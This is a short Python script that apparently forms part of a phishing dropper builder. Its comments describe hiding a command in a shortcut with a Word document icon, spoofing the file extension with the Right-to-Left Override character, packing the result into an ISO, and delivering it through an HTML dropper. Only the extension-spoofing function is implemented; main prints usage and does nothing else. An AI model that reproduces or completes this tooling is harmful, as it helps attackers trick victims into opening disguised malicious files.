# Take a command and output path to put html
# Make a shortcut with docx icon that runs given command and then use RTLO Extension Spoofing 
# Pack the shortcut in ISO file using New-IsoFile.ps1 script
# Package all that into a html dropper

import os, sys
import shutil

def create_rtlo_file(input_file, output_directory, spoofed_extension):
    filename, extension = os.path.splitext(os.path.abspath(input_file))
    reverse = spoofed_extension[::-1]
    newname = os.path.join(
        output_directory, f"{os.path.basename(filename)}\u202e{reverse}{extension}"
    )

    if os.path.isfile(newname):
        print("Removing old file: {}".format(newname))
        os.remove(newname)

    try:
        shutil.copy(input_file, newname)
    except Exception as e:
        print("[!] Error during spoofing extension using RTLO: {}".format(e))
        sys.exit(1)

    return os.path.abspath(newname)


def main():
    if len(sys.argv) != 3:
        print(f"{sys.argv[0]} <command to run> <output_file>")

if __name__ == "__main__":
    main()